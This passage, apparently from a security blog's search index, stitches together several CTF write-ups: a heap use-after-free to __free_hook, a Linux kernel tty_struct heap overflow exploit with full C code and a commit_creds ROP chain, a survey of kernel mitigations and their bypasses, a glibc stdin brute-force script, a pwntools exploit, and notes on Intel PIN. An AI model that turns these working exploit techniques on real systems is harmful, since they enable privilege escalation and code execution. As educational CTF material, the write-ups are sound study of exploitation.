business.\nVulnerability\nDuring the CTF , we were able to find out the bug but there's a cool way by which it has to be triggered. The bug is that , if we give 0x10 bytes for the candle name,  and try to print name , puts nulls out the candle reference count pointer. So you might ask , what is so useful about it? Well , remember in the Remove candle function , if this reference pointer is found to be nulled, we skip the whole part of decrementing the count altogether. We only free the candle pointer and null out it's subsequent bss entry.\nTriggering the char overflow\nAnother important thing to note is that candle count is a char meaning it is bound to overflow. Now that we can prevent the decrement of candle count , we can very well trigger the overflow , all thanks to the leakguard :).\nOnce we trigger the overflow,  the candle counter resets and finally we can free the wax pointer without nulling out it's subsequent memory. Hence we triggered a use after free.\nBut wait , we're missing out on something very important , the leaks.\nLeaks\nEven if leakguard does a good job by nulling a valid memory address , it cannot prevent partial memory leaks. Yes , you heard it right.\nWe can leak by overwriting the last 2 bytes of a heap address to make it an invalid memory address thus safely bypassing leakguard.\nTo get proper leaks , we might have to resort to methods like binary search to fix the invalid addresses that we leak or in worst cases , bruteforce. So, what about libc??\nLeak code segment address , then when we add a candle , the free wax structure is taken for allocation. Hence , we can change the contents of the structure. Recollect that the structure has pointers to the names of oil and dye. If we overwrite any of the pointer to the GOT address of stdout (which is there in bss) , we can leak libc in the subsequent printing of candle names.\nGetting that shell\nNow that you have a Use After Free , a libc leak and what's more, the provided libc is 2.27 hence no double free checks (phew!),\nIsn't that enough to pwn this binary now?\nOnce we get libc leak , we take the following steps to get shell :\n\nOverwrite the reference counter in the wax structure with 0x100 such that last byte is null.\nDelete wax structure to free it.\nDelete an intermediate candle.\nNow delete a candle linked to the wax structure which was freed , since reference counter was 1 , it will become 0 and free the struct again.\nNow add candle to get our free wax structure back.\nOverwrite fd with __free_hook.\nAfter another allocation , we get allocation at __free_hook itself,  overwrite that with system.\n\nWait,  doing that will null the address of system since __free_hook is now a candle. Thinking a little , we can get allocation at __free_hook - 1 , overwrite first byte with \\x00 so that we bypass the leakguard and hence overwrite __free_hook with system.\nAdd a candle with data as /bin/sh\\0 and free that candle to get shell.\nConclusion\nThe idea of triggering a uaf with a char overflow is really novel. I had a great time solving the challenge.

But, if we combine the llseek and read, write, we leverage a sweet heap overflow. As you can see, the mod_read and mod_write don't have any checks for out of bounds lseek, hence , what we can do is, seek to the end of the memo and read or write 0x400 bytes.\nExploitation\nThe idea here is, to have a kernel structure getting allocated just after our memo, so that we can read and write to it. Since, our memo is of size 0x400 , it will be allocated from the kmalloc-1024 pool, and one super famous kernel structure which is also allocated from the kmalloc-1024 pool is the good old tty_struct.\nSo, now the plan is -\n\nSpray kmalloc-1024 and get a tty structure opened near our memo.\nlseek and read from the tty_struct. Leak heap and kernel function pointer.\nSimilar, write to the same function pointer, the address of heap which has the gadget to pivot stack to heap.\nCalling ioctl triggers our ptx_unix98_ops function pointer giving us rip control to pivot stack to rop on heap.\n\nLet's script the Leak part.\n#define _GNU_SOURCE\n\n#include &lt;stdio.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;sys/stat.h&gt;\n#include &lt;fcntl.h&gt;\n#include &lt;errno.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;sys/msg.h&gt;\n#include &lt;sys/ioctl.h&gt;\n#include &lt;sys/mman.h&gt;\n#include &lt;sys/syscall.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stdlib.h&gt;\n\n#define INVALID -1\n\nint ptmx;\nunsigned long user_cs,user_sp,user_ss,user_rflags,fd;\nunsigned long kbase,kheap;\nunsigned long leak_buf[0x400/8];\nunsigned long push_r12_pop_rsp;\nunsigned long pop_rdi,prepare_kernel_cred,commit_creds,pop_rcx,mov_rdi_rax,kpti_trampoline;\n\nvoid save_state(){\n    __asm__(\".intel_syntax noprefix;\"\n            \"mov user_cs,cs;\"\n            \"mov user_ss,ss;\"\n            \"mov user_sp,rsp;\"\n            \"pushf;\"\n            \"pop user_rflags;\"\n            \".att_syntax;\");\n    puts(\"[+] Saved user state!\");\n}\n\nvoid Open_and_spray(){\n    for(int i=0;i&lt;10;i++){\n        ptmx = open(\"/dev/ptmx\",O_RDWR | O_NOCTTY);\n        if(ptmx &lt; 0){\n            perror(\"[-] Failed to open ptmx\");\n            exit(INVALID);\n        }\n    }\n    fd = open(\"/dev/memo\",O_RDWR);\n    if(fd &lt; 0){\n        perror(\"[-] Err in memo\");\n    }\n    char buf[0x400];\n    memset(buf,0x61,sizeof(buf));\n    write(fd,buf,0x400);\n    puts(\"[+] Opened memo!\");\n    ptmx = open(\"/dev/ptmx\",O_RDWR | O_NOCTTY);\n    if(ptmx &lt; 0){\n        perror(\"[-] Failed to open ptmx\");\n        exit(INVALID);\n    }\n}\n\nAs you can see, initially, we spray the kmalloc-512 by opening /dev/ptmx which internally allocates alloc_tty structure via kmalloc-1024 pool. So, when we open memo and then allocate another ptmx, we get contiguous allocation of memo followed by the tty_struct.\nNow, we can safely get our leaks.\nvoid get_leaks(){\n    lseek(fd,0x100,SEEK_SET);\n    read(fd,leak_buf,0x400);\n    for(int i=0;i&lt;0x400/8;i++){\n        printf(\"[*] leak_buf[%d] -&gt; 0x%lx\\n\",i,leak_buf[i]);\n    }\n    kbase = leak_buf[99] - 0xe65900; //ptx_unix98_ops\n    kheap = leak_buf[103] - 0x438;\n    printf(\"[+] kbase = 0x%lx\\n\",kbase);\n    printf(\"[+] kheap = 0x%lx\\n\",kheap);\n    push_r12_pop_rsp = kbase + 0x94d4e3L; \n    pop_rdi = kbase + 0x1268L;\n    pop_rcx = kbase + 0x4c852L;\n    prepare_kernel_cred = kbase + 0x7bb50L;\n    mov_rdi_rax = kbase + 0x19dcbL;\n    commit_creds = kbase + 0x7b8b0L;\n    kpti_trampoline = kbase + 0xa00a45L;\n    ?printf(\"[+] push_r12_pop_rsp = 0x%lx\\n\",push_r12_pop_rsp);\n}\n\nYou will soon know why I have used gadgets like push_r12_pop_rsp and pop_rcx. (rest everything is required for a standard cc(pkc(0)))\nROP on Heap\nNow that we have the necessary leaks, we can now go ahead and overwrite our ptx_unix98_ops with a fake function pointer (our pivot gadget on heap).\nvoid write_rop(){\n    //overwrite the same ptx_unix98_ops with address of heap rop chain\n    leak_buf[99] = kheap + 0x120;\n    leak_buf[16] = push_r12_pop_rsp;\n\n\nWe use the previous buffer into which we read our leaks. We see that ptx_unix98_ops is at 99th offset and thus we overwrite it with our memo+0x120. We also populate our memo+0x120 which is at offset 16th with our pivot gadget.\nBut wait , so how does that pivot actually happen. The reason is, we are calling ioctl on the opened ptmx , which will internally invoke the ptx_unix98_ops function pointer. So, how does this work? For that , we should closely check the arguments of the ioctl userspace call.\nint ioctl(int fd, int request, char* cmd);\n\nSince, the first two arguments are int, they're not of much use, but the third argument is a char *, which means its a pointer and we fully control it. So now, we should ideally be searching for push rdx ; pop rsp gadgets right? Well, what I observed during debugging is that such push rdx gadgets are dereferencing registers which are not pointers and also not in our control. Hence , I had to now see which all registers were set to our heap pointer which we pass as argument.\nAfter some debugging , I found that r12, rdx and rcx were set to our heap pointer. Hence , I used the push r12 gadget which did not compromise with the control flow.\nAfter that, we can nicely pivot to heap and execute our rop chain.\nvoid write_rop(){\n    //overwrite the same ptx_unix98_ops with address of heap rop chain\n    leak_buf[99] = kheap + 0x120;\n    leak_buf[16] = push_r12_pop_rsp;\n    puts(\"[+] Writing ROP now!\");\n    //building rop now\n    unsigned long *rop = &amp;leak_buf[0];\n    *rop++ = pop_rdi;\n    *rop++ = 0;\n    *rop++ = prepare_kernel_cred;\n    *rop++ = pop_rcx;\n    *rop++ = 0;\n    *rop++ = mov_rdi_rax;\n    *rop++ = commit_creds;\n    *rop++ = kpti_trampoline;\n    *rop++ = 0; //rdi\n    *rop++ = 0; //rax\n    *rop++ = (unsigned long)priv_esc;\n    *rop++ = user_cs;\n    *rop++ = user_rflags;\n    *rop++ = user_sp;\n    *rop++ = user_ss;\n    lseek(fd,0x100,SEEK_SET);\n    write(fd,leak_buf,0x400);\n    ioctl(ptmx,0xcafebabe,kheap+0x100-0x8);\n}\n\nI used a mov_rdi_rax gadget which essentially moves the cred_struct so that we can call commit_creds(prepare_kernel_cred(0)).\nOne small twitch here is, for some reason, the kernel always panicked if I directly attempted to call mov_rdi_rax and then commit_creds. Hence, I included a pop_rcx gadget before that which (according to my dim knowledge) must be due to some stack alignment issue? Honestly, Im not really sure.\nFinally, we get our long awaited shell. Also, for some other reason (again to my dim knowledge of the internals) system(\"/bin/sh\") was also issuing recursive kernel panics, and thus had to use execve to get root.\nConclusion\nI learnt a lot about the kernel heap from this challenge and there are things in this challenge which I have to look into (for instance , the reason for using a pop_rcx gadget before calling commit_creds).\nFull Script - Here\n","id":"https://pwnverse.github.io/posts/meow/","title":"Meow Meow zeropts 2020"},"https://pwnverse.github.io/posts/mitigations/":{"body":"I've been looking into some linux kernel lately and this blog post is to get familiar with all kernel mitigations like SMEP , SMAP , KPTI and FG-KASLR. This post is a beginner friendly one (as I myself am a noob).\nThe story of kernel mitigations\nThe linux kernel has come a long way from being a primitive micro kernel to a super powerful (and relatively secure) micro kernel. Back in the early 90's there were almost no protections in the baby linux kernel. If an attacker gets code execution in the kernel , the attacker becomes capable of running code in the very ring zero ie, with highest possible privileges (root). Since the linux kernel is a large piece of software, so it has a lot of attack vectors/structures which can be used to immediately escalate our privileges to root (another post on attack vectors in kernel soon).\nOne thing that makes kernel exploitation so interesting is that you control the entire userspace operations , you have to make any possible function calls, leak kernel pointers, overwrite useful structures in the kernel and get root.\nMitigation #1 - Ret2user\nFor those familiar with the technique of ret2shellcode in userspace exploitation , this is almost the same stuff. If you have a null pointer dereference in older kernels , you can easily get root as the saying goes \"One null deref can root them all\". \nSo, a mitigation against this technique was KERNEXEC which basically sets syscall table, Interrupt Descriptor Table, Global Descriptor Table, some page tables to RO and set data pages to NX. As we can see, making kernel pages RO is super helpful to minimizing the attack surfaces and ret2dir attacks.\nFollowing KERNEXEC, the well known SMEP mitigation had rolled out to provide a subset of functions of KERNEXEC. SMEP prevents stuff like mmaping and executing shellcode to get root. It basically prevents execution of any page which is not a part of the kernel space. But unlike KERNEXEC, it doesnt prevent exploitation of RWX or important kernel data structure. In kernel, this is enabled by setting the 20th bit of the CR4 control register.\nBypassing SMEP\nWith some ROP , we can unset the 20th of the CR4 register, and to our delight, there's a function in the kernel which does exactly the same thing, mov cr4,ediand the function is native_write_cr4. \nBut wait there's a cakehole we're going towards. In reality, the latest kernels have this super cool feature which pins or hardcodes the CR4 register thus attempting to change it is practically impossible. Hence, we'll have to ROP our way to previlege escalation with commit_creds(prepare_kernel_cred(0)).\nHere's the relevant code to end our ecstasy.\nvoid native_write_cr4(unsigned long val)\n{\n\tunsigned long bits_changed = 0;\n\nset_register:\n\tasm volatile(\"mov %0,%%cr4\": \"+r\" (val) : : \"memory\");\n\n\tif (static_branch_likely(&amp;cr_pinning)) {\n\t\tif (unlikely((val &amp; cr4_pinned_mask) != cr4_pinned_bits)) {\n\t\t\tbits_changed = (val &amp; cr4_pinned_mask) ^ cr4_pinned_bits;\n\t\t\tval = (val &amp; ~cr4_pinned_mask) | cr4_pinned_bits;\n\t\t\tgoto set_register;\n\t\t}\n\t\t/* Warn after we've corrected the changed bits. */\n\t\tWARN_ONCE(bits_changed, \"pinned CR4 bits changed: 0x%lx!?\\n\",\n\t\t\t  bits_changed);\n\t}\n}\n\nHence, to bypass SMEP, we can do some ROP to set commit_creds(prepare_kernel_creds(0)).\nMitigation #2 - Accessing User memory when executing kernel code\nAny attempt by user space program to examine or modify the kernel's part of the address space will result in a plain segfault as we've seen until now. But the access in the other direction (kernel modifying userspace memory) is much less controlled. when the processor is in kernel mode, it has full access to any address that is valid in the page tables. Or nearly full access; the processor will still not normally allow writes to read-only memory, but that check can be disabled when the need arises.\nIntel's Supervisor Mode Access Prevention (SMAP) which came in around 2012  with the linux kernel 3.7 completely changed this situation. This extension defines a new SMAP bit in the CR4 control register (21st bit) which when set, any attempt to access user-space memory while running in a privileged mode will lead to a page fault.\nNaturally, there are times when the kernel needs to work with user-space memory. To that end, Intel has defined a separate AC flag that controls the SMAP feature. If the AC flag is set, SMAP protection is in force, otherwise access to user-space memory is allowed. To achieve this , two new instructions (STAC and CLAC) were introduced to modify that flag quickly. User-space access functions (get_user(), for example, or copy_to_user()) clearly need to have user-space access enabled.\nWell, now you may ask, why do we even need this mitigation if the kernel itself can modify it's own access to the userspace memory. The answer is it can block a whole class of exploits where the kernel is fooled into reading from (or writing to) user-space memory by mistake. \nBypassing SMAP\nThe SMAP can be bypassed with kernel based Return oriented Programming only in the kernel space to get root.\nMitigation #3 - Address Space Randomization in the kernel\nNot very long from now, in 2014, the KASLR was finally merged into the mainstream vanilla linux kernel 3.14. As one can expects, it randomizes entire address space from the base address. But as you can probably think now, defeating KASLR is pretty trivial since virtually every kernel address is offsetable from the base address. So, this technique wasn't really a hit in the community.\nMitigation #4 - Page Table Isolation\nPage Table Isolation (pti, previously known as KAISER) is a countermeasure against attacks on the shared user/kernel address space such as the Meltdown. This mitigation came into the linux kernel 4.15. Page-table entries contain permission bits describing how the memory they describe can be accessed; these bits are, naturally, set to prevent user space from accessing kernel pages, even though those pages are mapped into the address space.\nBut, a number of hardware level bugs allow a user-space hacker to determine whether a given kernel-space address is mapped or not, regardless of whether any page mapped at that address is accessible. This basic information can be used to defeat KASLR.\nOn a system with 4 levels of page tables ,the top level is the Page Global Directory (PGD), below that come the Page upper directory (PUD), Page Middle Directory (PMD)  and Page Table Entries (PTE). Page-table resolution normally traverses the entire page table tree to find the PTE of interest. The PTE is actually used to translate virtual memory address (CPU generated) to physical memory address(actual location on RAM).\nOne of the first steps taken in the KPTI patch is to create a second Page Global Directory one for kernel space and the other one when the program is running in userspace. So , in whole, the KPTI separates kernel and user page tables.\nBypassing KPTI\n\n\nUsing a KPTI trampoline this method is based on the idea that if a syscall returns normally, there must be a piece of code in the kernel that will swap the page tables back to the userland ones, so we will try to reuse that code to our purpose. The function is swapgs_restore_regs_and_return_to_usermode, and what it does is to swap page tables, swapgs and iretq.\n\n\nAnother weird technique is leveraging the power of signal handlers. So, when we try to return to usermode and execute code, the page table still being used is the kernel page table which is by default prevented to execute code in the usermode and hence a segfault happens in the userspace. If a segfault handler is used instead, and to handle the SIGSEGV signal, if we call our shell function, we get root shell given that we have already set the commit_creds(prepare_kernel_creds(0)).\n\n\nMitigation #5 - Function Granular Kernel Address Space Randomization\nThis is the latest mitigation of the linux kernel version 5.11. With FGKASLR, individual kernel functions are reordered so that even if the kernel's randomized based address is revealed, an attacker still wouldn't know the location in memory of particular kernel functions as the relative addresses will be different. FGKASLR reorders the functions at boot time and is a further improvement to Linux security for attacks that require known positions within the kernel memory.\nBypassing FG-KASLR\nThe only way to bypass FGKASLR is to search for constant offset functions by leaking multiple pointers in various parts of the desired kernel memory. There are a few functions which are not effected by the FGKASLR at all, so we hunt for such functions.\nConclusion\nLinux has come a long way now with all these mitigations. Yet, vulnerabilites and bypasses never stop coming into the way of security and hence newer mitigations are only a few lines of code away.\nReferences\n\nFGKASLR\nKPTI Trampoline\nKPTI\nSMAP\nSMEP\nAn Awesome blog post\n\n","id":"https://pwnverse.github.io/posts/mitigations/","title":"Mitigations of the Linux Kernel"},"https://pwnverse.github.io/posts/nullptr/":{"body":"tl;dr\n\nOverwrite mmap_threshold with null and trim top chunk size.\nNull out last 2 bytes of stdin's _IO_buf_base and brute force to get allocation on stdin.\nOverwrite one of the jump tables with win function to get shell.\n\n\nChallenge Points: 453\n**Solves: ** 4\nWe had a really great time this weekend with this year's edition of Alles CTF.

Let's see how this can be done.\n\nNulling out mmap_threshold with triggers a different code path in malloc.\nAlso , trimming top size by writing null misaligned finally calls mmap when malloc is invoked.\n\nNow , all that we have to do is , brute force until an mmap happens near our stdin file structure and from there on , its a game over.\nLet's take our script forward.\n        buf_base = libc + 0x1ea9b8\n        input_buffer = getdata(buf_base)\n        TARGET_REGION = libc + 0x1ea000\n        TARGET_HOOK_OFFSET = 0xb70\n        TARGET_STDIN_OFFSET = 0x980\n        _IO_2_1_stdin_ = libc + LIBC.symbols['_IO_2_1_stdin_']\n        mmap_threshold_ = libc + 0x1ea280\n        MAIN_ARENA_TOP_CHUNK_PTR = libc_base + 0x1eabe0\n        top_chunk = getdata(MAIN_ARENA_TOP_CHUNK_PTR + 8)\n        _IO_stdfile_0_lock = libc_base + 0x1ed4d0\n        __GI__IO_file_jumps = libc_base + 0x1ec4a0\n        MASK = 0xffffffffffff0000\n        if TARGET_REGION &amp; MASK != TARGET_REGION:\n            log.failure(\"Restart exploit\")\n            io.close()\n        continue\n        else:\n            break\n       #Null out top chunk partially keeping the inuse bit\n       #Null out mmap_threshold and next malloc should call mmap\n       null(mmap_threshold + 16) \n       null(top_chunk + 8 + 1)\n\n       # malloc will now be mmap!\n       # We keep calling mmap from malloc and bruteforce for getting allocation at stdin\n       for _ in range(200):\n           malloc(libc)\n           input_buffer = getdata(_IO_2_1_stdin_ + 8 * 3)\n           if (input_buffer &amp; MASK) == TARGET_REGION:\n               log.success('Hit')\n               break\n\n      \n\nOnce there's a hit , all that's left is to partially overwrite IO_buf_base and get allocation on stdin. Here , after getting allocation on stdin , we intend to overwrite malloc hook to get shell.\n        #Now we partially overwrite io buf base of stdin\n        null(_IO_2_1_stdin_ + 8*7 - 6)\n        _s = TARGET_STDIN_OFFSET\n        data = p64(0xfbad2088) + p64(TARGET_REGION)*6 + p64(0)*5 + p64(0) + p8(0) + p64(_IO_stdfile_0_lock) + p32(0) + p64(__GI__IO_file_jumps)\n        data = data.ljust(TARGET_HOOK_OFFSET,'x')\n\n        sla(data)\n        #overwritten malloc hook\n        #call malloc to get shell\n        malloc(libc)\n        io.interactive()\n\n\nAn alternative approach\nWe could be all lazy and let brute force do the work. A simpler yet time consuming approach would be to overwrite the last 3 bytes of stdin's IO_buf_base and wait for the magic to happen. Eventually , in one of the runs , it would match with binary bss and you get a direct write to GOT table.\nConclusion\nThe challenge had really intersting concepts involved and we learnt quite alot.

it just compiles from native machine code to native machine code.\n\nOnce compiled code is stored and used from code cache and doesn't have to be recompiled again.\n\n\nDBI engines like PIN , DynamoRIO , Dyninst and PEBIL reduce runtime overhead by rewriting control-flow instructions when possible , so they jump directly , to the next block in the code cache without any intervention of the DBI system.\n\n\nWhen the direct jumps to code cache are not possible , the rewritten instructions return control to the DBI engine so that it can prepare and start the next code chunk.\n\n\nWhile most instructions run natively in the code cache , the DBI engine may emulate some instructions instead of running them directly. PIN does this exquisitely for system calls like execve that require special handling by DBI engine.\n{: .notice}\n\nThe instrumented code contains Callbacks to functions in the DBI tool that observe or modify the code's behaviour.\n\nNow that we're familiar with the workings DBI engine , let's get our hands dirty with PIN internals.\nPIN INTERNALS\nPin fetches and JIT-compiles at trace granularity , a basic block-like abstraction that can be entered only at top but may contain multiple exits, unlike regular basic blocks.\nTRACE\nPin defines a trace as a straight-line instruction sequence that ends when it hits an unconditional control transfer or reaches a predefined maximum length or number of conditional control-flow instructions.\n\nAlthough PIN always JIT-compiles code at trace granularity , it allows you to instrument code at many granularities , including instruction, basic block , trace , function and complete executable[image].\n\nThe DBI tools we implement with PIN are called Pintools , which are shared libraries that we write with in C/C++ using Pin API.\nThe Pintool consists of 2 components.\n\n\nInstrumentation Routines\n\nTell which Pin which instrumentation code to add where.\nThese functions run only the first time Pin encounters a particular piece of code that's not yet instrumented.\n\n\n\nAnalysis Routines\n\nTo instrument code , the instrumentation routines install callbacks to analysis routines.\n\n\n\nCallBacks contain the actual instrumentation code and are called everytime an instrumented code sequence runs.\n{: .notice}\nWell, now it's time to play around with Pin. I came across a practical example to learn a bit more on the internals of PIN.\nLet's see what that is.\nPROFILING WITH PIN\n\n\nThe profiling tool records statistics about a program's execution to help optimize that program.\n\n\nIt counts the number of executed instructions and the no. of times basic blocks , functions and syscalls are involved.\n\n\nPintools can implement tool-specific command line options , which are called knobs in pin's slang.\n\n\nThere is a dedicated class called KNOB Class that we can use to create command line options. We'll analyse the example implementations in detail.\n\n\n\n//profiler.cpp\n\n#include \"pin.H\"\n\nKNOB&lt;bool&gt; ProfileCalls(KNOB_MODE_WRITEONCE,\"pintool\",\"c\",\"o\",\"Profile function calls\");\nKNOB&lt;bool&gt; ProfileSyscalls(KNOB_MODE_WRITEONCE,\"pintool\",\"s\",\"o\",\"Profile syscalls\");\n\n\nHere there are two options of the type KNOB called ProfileCalls and ProfileSyscalls.\n\nThe options use mode KNOB_MODE_WRITEONCE because they're Boolean Flags that are set only once when we supply the flag.\n\n\nWe can enable ProfileCalls flag by passing -c flag.\nWe can enable ProfileSyscalls flag by passing -s flag.\n\nBoth flags are by default set to false , means if we dont pass the command-line flags, they remain disabled throughout the course of the execution of our pintool.\nWe can also create other types of command line args , like str or int.\n//continuation of profiler.cpp\n\nstd::map&lt;ADDRINT,std::map&lt;ADDRINT,unsigned long&gt; &gt; cflows;\nstd::map&lt;ADDRINT,std::map&lt;ADDRINT,unsigned long&gt; &gt; calls;\nstd::map&lt;ADDRINT,unsigned long&gt; syscalls;\nstd::map&lt;ADDRINT,std::string&gt; funcnames;\n\n\nOur profiler uses multiple std::map data structures and counters to keep track of program's runtime statistics.\nThe cflows and calls data structures map addresses of control flow targets to another map that inturn tracks the address of  the control flow instructions that invoke each target and counts how often that control transfer was taken.\nThe syscall map simply tracks how often a syscall was triggered and the funcnames maps function address to symbolic names.\n\n//continuation of profiler.cpp\n\nunsigned long insn_count = 0;\nunsigned long cflow_count = 0;\nunsigned long call_count = 0;\nunsigned long syscall_count = 0;\n\nThese counters are self-explanatory.\nInitializing PIN\nLike normal programs written in C/C++ , pintools also start with a main function.\n//continuation of profiler.cpp\n\nint main(int argc,char *argv[])\n{\n    PIN_InitSymbols(); //Reads the application's symbol tables\n    if(PIN_Init(argc,argv)) //Initializes PIN , has all cmd-line options as well as PINtool's options while creating knobs\n    {\n        print_Usage();\n        return 1;\n    }\n}\n\nSo we have setup PIN , and now the most important part of initializing pintool is registering the instrumentation routines that are responsible for instrumenting the application.\nThe profiler registers three instrumentation routines.\n\nparse_funcsyms , instruments at image(executable) granularity.\ninstrument_trace and instrument_insn instrument at trace and instruction granularity.\n\nTo register these with PIN , we call IMG_AddInstrument Function, TRACE_AddInstrument Function and INS_AddInstrument Function .\nThe 3 instrumentation routines that we've seen just now take an IMG ,a TRACE and an INS object as their first parameter, respectively depending on their type. As a second arg , these functions take a void * which allow us to specify when we register the instrumentation routines using *_AddInstrument Function.\nSYSCALL ENTRY FUNCTION\nPin also allows us to call functions before or after every syscall , in the same way we register instrumentation callbacks.\n\nNote that we can't specify callbacks for some syscalls but we can differentiate between syscalls inside the callback function.\n\nThe Profiler uses Pin_AddSyscallEntryFunction to register a function named log_syscall that's called whenever a syscall is entered.\n\nTo register a callback that triggers when a syscall exits , we can use PIN_AddSyscallExitFunction instead.\n\nNote that profile registers the callback only if the value of ProfileSyscall is true.\nFINI FUNCTION\nThe final callback that the profile registers is a fini function , which is called when the app exits or when the PIN is detached from it.\nThis function is responsible for printing profiling results.\n{: .notice}\n//continuation of profiler.cpp\n\n    IMG_AddInstrumentFunction(parse_funcsyms,NULL); //second arg is passed as NULL here\n    TRACE_AddInstrumentFunction(instrument_trace,NULL);\n    INS_AddInstrumentFunction(instrument_insn,NULL);\n\n    if(ProfileSyscalls.value())\n    {\n        PIN_AddSyscallEntryFunction(log_syscall,NULL); //logging syscalls\n    }\n    PIN_AddFiniFunction(print_results,NULL);\n\n    PIN_StartProgram(); //Never returns and hence return 0 is never reached\n\n    return 0;\n\n\nLet's look at a few details of Parsing Function Symbols.\nPARSING FUNCTION SYMBOLS\nWe recall that parse_funcsyms is an image-granularity instrumentation routine. Such routines are called when a new image(binary/library) is loaded, allowing us to instrument the image as a whole.\nThis also lets us loop over all the functions in the image and add analysis routines before or after a function.\n\nNote that function instrumentation is reliabel only if the binary contains symbolic info.\nAlso note that after-function instrumentation doesn't work with some optimizations , such as tail calls.\n\n//continuation of profiler.cpp\n\nstatic void parse_funcsyms(IMG img,void *v)\n{\n    if(!IMG_valid(img)) //checks for a valid image\n        return;\n}\n\n\nIf the image is valid , parse_funcsyms loops over all SEC objects in the image , which represent all sections.\n    for(SEC sec = IMG_SecHead(img); SEC_Valid(sec); sec = SEC_Next(sec))\n    {\n        for(RTN rtn = SEC_RtnHead(sec) ; RTN_Valid(rtn); rtn = RTN_Next(rtn))\n        {\n            funcnames[RTN_Address(rtn)] = RTN_Name(rtn);\n        }\n    }\n\n\nFor each section , parse_funcsyms iterates over all the functions (represented by RTN objects , meaning Routine ) and maps each function's address in the funcnames map to the symbolic name of the function , if the function name is unknown then it returns an empty string.\nREMARK -&gt; This kind of function based instrumentation is rendered useless in stripped binaries which are devoid of any symbols.\nIMPLEMENTING BASIC BLOCK INSTRUMENTATION\nUnfortunately , we can't implement basic blocks in PIN API directly , ie , there's no BBL_AddInstrumentFunction.\nTo instrument basic blocks , you have to add a Trace level instrumentation routine and then loop over all basic blocks in trace , instrumenting each one.\nstatic void instrument_trace(TRACE trace , void *v)\n{\n    IMG img = IMG_FindByAddress(TRACE_Address(trace));\n    if(!IMG_Valid(img) || !IMG_IsMainExecutable(img))\n        return;\n    for(BBL bb = TRACE_BblHead(trace) ;

The only difference is that this new callback uses insertion point IPOINT_AFTER and passes fallthrough's address as the target address to record\nINSTRUMENTING CALLS\nThe profiler keeps a separate counter and mapping to track called functions so that we can see which functions are more better for our application.\nRecall that we have to pass -c flag to enable tracking called functions.\n{: .notice}\nTo instrument calls , our instrument_insn uses INS_IsCall to separate calls from other instructions.\n\nif(INS_IsCall(ins))\n{\n    if(ProfileCalls.Value())\n    {\n        INS_InsertCall(ins,IPOINT_BEFORE,(AFUNPTR)count_call,IARG_INST_PTR,IARG,BRANCH_TARGET_ADDR,IARG_END);\n\n    }\n}\n\n\nIf the instruction is a call , then the profiler inserts an analysis callback before the call instruction at IPOINT_BEFORE to an analysis routine called count_call passing in the call's source , ie the Instruction Pointer and target address.\nHere it's safe to use INS_InsertCall instead of INS_InsertPredicatedCall because there are no call instructions with built-in conditionals.\nNow let's see a few analysis routines that we've used so far.\n\nstatic void count_bb_insn(UNINT32 n)\n{\n    insn_count += n\n}\n\nstatic void count_cflow(ADDRINT ip, ADDRINT target)\n{\n    cflows[target][ip]++;\n    cflow_count++;\n}\n\nstatic void count_call(ADDRINT ip, ADDRINT target)\n{\n    calls[target][ip]++;\n    call_count++;\n}\n\nstatic void log_syscall(THREADID tid , CONTEXT *ctx, SYSCALL_STANDARD std , VOID *v)\n{\n    syscalls[PIN_GetSyscallNumber(ctx,std)]++;\n    syscall_count++;\n}\n\nThe function log_syscall is not a regular analysis routine but a callback for syscall entry events.\nIn PIN , syscall handlers take 4 args , a THREADID identifying the thread that made the syscall ; a CONTEXT * containing things like syscall number , arguments , and return value (only for syscall exit handlers) ; a SYSCALL_STANDARD argument that verifies the syscall's calling convention and finally the void* which allows us to pass user-defined data structure.\nRecall that purpose of  log_syscall is to record how often each syscall is called. \nIt calls Get_SyscallNumber to get the current syscall's number and records a hit for that syscall in syscalls map.\n","id":"https://pwnverse.github.io/posts/pin/","title":"Short Notes on Internals Of the Intel PIN"},"https://pwnverse.github.io/posts/rbsystem/":{"body":"This weekend , we have a great time playing Cyber Mimic CTF and this post is supposedly the intended solution for the challenge Rbsystem that we solved during the CTF.\nTL;DR OF THE BINARY\nThe binary is a standard x86 64-bit Dynamically linked binary.

We could pass negetive integers as offset and write random bytes at almost arbitrary locations.\nSo at this point we were quite stuck , what is the use of writing out random bytes anywhere? Then after sometime,  something weird but interesting popped up.\nWell we can write random bytes anywhere ,\nWhy not try writing just one null byte at the File Descriptor field of the file structure stored on heap so that it reads from stdin instead of /dev/urandom?\n{: .notice}\nWell this idea was great but it required a 1 byte brute force over the server [and our vm was deadslow :/].\nHaving no other option at our hands , we decided to go this way.\nwait , what about leaks?\nThats a little trivial since we can close and re allocate our file structure on heap. Here's the idea.\n\nCall Open and allocate the file structure on heap.\nNow call malloc to avoid top consolidation\nClose the file structure.\n\n\nRemember that fclose calls free internally.\n\n\nNow malloc as the same size of the file structure.\nWell you have the old file structure with some libc pointers still lurking around which u can leak by adding random bytes till that location by calling edit.\n\nfrom pwn import *\nimport sys\n\nif(len(sys.argv)&gt;1):\n    io=remote('172.35.29.46',9999)\n    context.noptrace=True\nelse:\n    io=process('./rbsystem',env = {\"LD_PRELOAD\" : \"./libc.so.6\"})\n\nreu = lambda a : io.recvuntil(a)\nsla = lambda a,b : io.sendlineafter(a,b)\nsl = lambda a : io.sendline(a)\nrel = lambda : io.recvline()\nsa = lambda a,b : io.sendafter(a,b)\nre = lambda a : io.recv(a)\n\ndef add(idx,size):\n    sla('choice: ','1')\n    sla('Index: ',str(idx))\n    sla('Size: ',str(size))\n\ndef edit(idx,off,size):\n    sla('choice: ','2')\n    sla('Index: ',str(idx))\n    sla('Offset: ',str(off))\n    sla('Size: ',str(size))\n\ndef show(idx):\n    sla('choice: ','3')\n    sla('Index: ',str(idx))\n\ndef fopen():\n    sla('choice: ','4')\n\ndef fclose():\n    sla('choice: ','5')\n\nif __name__==\"__main__\":\n    fopen()\n    fclose()\n    add(0,544)\n    fopen()\n    #Fill with random bytes until Libc\n    edit(0,0,104)\n    #Get libc\n    show(0)\n    re(113)\n    libc_base = u64(re(6)+\"\\x00\"*2) - 0x3ec680\n    log.info(\"Libc @ \"+str(hex(libc_base)))\n    #Well sometimes the exploit crashed due to some corrupted leak and hence I added this check\n    if(hex(libc_base)[2:4]==\"7f\"):\n        #Add a chunk in such a way that file structure if above it in memory.\n        add(1,544)\n        #Here goes our random byte at the offset of fd of the file structure.\n        edit(1,-4560,1)\n        #add a buffer chunk of 0x1000 bytes and call edit on it to fill it with random bytes.\n        